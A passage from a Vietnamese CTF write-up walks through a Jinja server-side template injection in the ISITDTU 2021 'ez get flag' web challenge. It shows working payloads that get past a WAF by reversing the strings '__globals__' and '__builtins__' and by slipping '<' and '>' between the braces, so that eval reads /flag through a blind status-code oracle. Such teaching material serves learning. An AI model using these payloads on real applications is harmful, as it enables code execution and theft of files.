</pre></table></code></div></div><p>Expression trên dịch nôm na ra theo tiếng Hooman là như này: mở file <code class="language-plaintext highlighter-rouge">/flag</code> ra rồi quét hết nội dung của nó (sử dụng <a href="https://www.w3schools.com/python/python_lists_comprehension.asp">list comprehension</a>) cho vào array rồi convert tất cả thành string, nếu tại index <code class="language-plaintext highlighter-rouge">s</code> của string này có chứa kí tự <code class="language-plaintext highlighter-rouge">char</code> thì sẽ trả về biến <code class="language-plaintext highlighter-rouge">s</code>, server sẽ trả về status code 200, nếu không sẽ trả về biến <code class="language-plaintext highlighter-rouge">a</code>. Mà biến <code class="language-plaintext highlighter-rouge">a</code> chưa được khai báo lần nào trong expression này nên khi eval sẽ bị lỗi, server sẽ trả về status code 500. Để biến <code class="language-plaintext highlighter-rouge">s</code> có thể iterate qua string trên thì tại parameter “globals” của hàm eval chúng ta sẽ gán <code class="language-plaintext highlighter-rouge">s</code> bằng độ dài của string “index” (sử dụng Filter <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.length">length</a> để lấy độ dài), và độ dài của string <code class="language-plaintext highlighter-rouge">s</code> sẽ tăng thêm 1 sau mỗi vòng lặp.</p><p>Nếu bạn nghĩ đến đây là có thể build script rồi lấy flag ngon ăn thì nhầm rồi! Payload <code class="language-plaintext highlighter-rouge">{{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}}</code> vẫn là chưa hợp lệ, vì trước khi được nạp vào hàm <code class="language-plaintext highlighter-rouge">render_template_string</code> nó sẽ bị sửa thành <code class="language-plaintext highlighter-rouge">{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}</code>, do đó không còn là Jinja Expression và sẽ không chạy được:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'admin'</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s">'check'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>

	<span class="n">picture</span> <span class="o">=</span> <span class="n">picture</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'{{'</span><span class="p">,</span><span class="s">'{'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'}}'</span><span class="p">,</span><span class="s">'}'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'#'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
</pre></table></code></div></div><p>Cách replace các kí tự bị cấm trong biến <code class="language-plaintext highlighter-rouge">picture</code> thành null này nhìn có vẻ an toàn, nhưng có một lỗ hổng nằm ở đoạn <code class="language-plaintext highlighter-rouge">replace('&gt;','')</code> và <code class="language-plaintext highlighter-rouge">replace('&lt;','')</code>. Chúng ta chỉ cần thêm 2 dấu ‘&gt;’ và ‘&lt;’ này vào giữa ‘{{‘ và ‘}}’ bypass được luôn, vì nó chỉ replace có 1 lần thôi :D</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="s">'__slabolg__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="s">'__snitliub__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">p</span><span class="o">=</span><span class="n">t</span><span class="p">.</span><span class="n">__init__</span><span class="p">[</span><span class="n">g</span><span class="p">][</span><span class="n">b</span><span class="p">][</span><span class="s">'eval'</span><span class="p">]</span><span class="o">%</span><span class="p">}{</span><span class="o">&lt;</span><span class="p">{</span><span class="n">p</span><span class="p">(</span><span class="s">' s if str([i for i in open("/flag")])[s]=="char" else a'</span><span class="p">,{</span><span class="s">'s'</span><span class="p">:</span><span class="s">"index"</span><span class="o">|</span><span class="n">length</span><span class="p">})}</span><span class="o">&gt;</span><span class="p">}</span>
</pre></table></code></div></div><p>Các bạn có thể đọc exploit code của mình tại <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/exploit/exploit.py">đây</a> rồi chạy thử.</p><p>Mặc dù vậy khi chạy exploit code chúng ta chỉ mới một nửa flag. Lí do nó spam các kí tự “a” ở cuối mà ko chịu in tiếp flag là vì theo exploit code thì string “index” sẽ được replace bằng một chuỗi “xxxx…” tăng dần, đồng nghĩa với độ dài payload sẽ liên tục tăng. Mà hàm isValid trong <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/source/files/lib/waf.py">waf.py</a> chỉ cho phép payload dưới 202 kí tự:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">countChar</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">202</span><span class="p">:</span>
	<span class="p">...</span>
</pre></table></code></div></div><p>Không sao cả, bạn chỉ cần thay đổi index của flag string từ <code class="language-plaintext highlighter-rouge">[s]</code> (iterate từ đầu đến cuối):</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="s">'__slabolg__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="s">'__snitliub__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">p</span><span class="o">=</span><span class="n">t</span><span class="p">.</span><span class="n">__init__</span><span class="p">[</span><span class="n">g</span><span class="p">][</span><span class="n">b</span><span class="p">][</span><span class="s">'eval'</span><span class="p">]</span><span class="o">%</span><span class="p">}{</span><span class="o">&lt;</span><span class="p">{</span><span class="n">p</span><span class="p">(</span><span class="s">' s if str([i for i in open("/flag")])[s]=="char" else a'</span><span class="p">,{</span><span class="s">'s'</span><span class="p">:</span><span class="s">"index"</span><span class="o">|</span><span class="n">length</span><span class="p">})}</span><span class="o">&gt;</span><span class="p">}</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/g4vVIOp.png" alt="" /></p><p>Thành <code class="language-plaintext highlighter-rouge">[-s]</code> (iterate từ cuối lên đầu):</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="s">'__slabolg__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="s">'__snitliub__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">p</span><span class="o">=</span><span class="n">t</span><span class="p">.</span><span class="n">__init__</span><span class="p">[</span><span class="n">g</span><span class="p">][</span><span class="n">b</span><span class="p">][</span><span class="s">'eval'</span><span class="p">]</span><span class="o">%</span><span class="p">}{</span><span class="o">&lt;</span><span class="p">{</span><span class="n">p</span><span class="p">(</span><span class="s">' s if str([i for i in open("/flag")])[-s]=="char" else a'</span><span class="p">,{</span><span class="s">'s'</span><span class="p">:</span><span class="s">"index"</span><span class="o">|</span><span class="n">length</span><span class="p">})}</span><span class="o">&gt;</span><span class="p">}</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/7hbg4RW.png" alt="" /></p><p>“Ez get flag” nhưng éo ez chút nào!!!! Flag cuối cùng là:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ISITDTU{A_FreE_FlaG_FOr_YoU_!!!!!!!!!!!_heHe}
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web-challenges/'>Web Challenges</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/isitdtu21/" class="post-tag no-text-decoration" >isitdtu21</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Write-up for all ISITDTU CTF Quals 2021 's web challenges - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Write-up for all ISITDTU CTF Quals 2021 's web challenges - Ethical Hackers Club&u=https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Write-up for all ISITDTU CTF Quals 2021 's web challenges - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h4>Recent Update</h4><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/SVATTT-Crypto/">ASCIS (ASEAN Student Contest on Information Security) 's Cryptography Write-ups</a><li><a href="/posts/SVATTT-Web/">ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</a><li><a href="/posts/FuSec3-Forensics/">FPTU SecAthon 2020 | Forensics Writeup | FRS301</a><li><a href="/posts/ACSC2021-Forensics/">Asian Cyber Security Challenge 2021 | Forensics Writeup | Nyong Coin, BitLocker Artifact</a><li><a href="/posts/FuSec4-CRY302-CRY303/">FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 & CRY303</a></ul></div><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h4 class="pl-3 pt-2 mb-2">Contents</h4><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FuSec4-PRP201/"><div class="card-body"> <em class="timeago small" date="2021-10-10 23:30:00 +0700" >Oct 10</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP201</h3><div class="text-muted small"><p> PRP201 Đây là challenge mà mình đã đoán được một phần, nhưng vẫn mất gần 1 ngày để giải ra :&amp;lt; Một sản phẩm đến từ anh Khoa (matuhn) Truy cập vào bài thì thấy có 5 đường dẫn đến 5 f...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec4-PRP202/"><div class="card-body"> <em class="timeago small" date="2021-10-13 12:30:00 +0700" >Oct 13</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP202</h3><div class="text-muted small"><p> PRP202 Một bài hay và cực khó với mình, chả trách người anh T giấu tên cứ bảo làm thử 2 ngày để làm, nhiều lần thất bại, nhưng kết quả thật xứng đáng Source code and analysis Source code Bắt...</p></div></div></a></div><div class="card"> <a href="/posts/SVATTT-Web/"><div class="card-body"> <em class="timeago small" date="2021-10-17 12:00:00 +0700" >Oct 17</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</h3><div class="text-muted small"><p> Ở SVATTT 2021 năm nay thì team mình không vượt qua vòng lại, tuy nhiên cá nhân mình vẫn solve đc 2 bài web Script Kiddie và OProxy, coi như là một kỉ niệm lần đầu đi thi SVATTT có vui lẫn buồn. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Forensics/" class="btn btn-outline-primary" prompt="Older"><p>Forensics</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/FPTU-Ethical-Hackers-Club">FPTU Ethical Hackers' Club</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
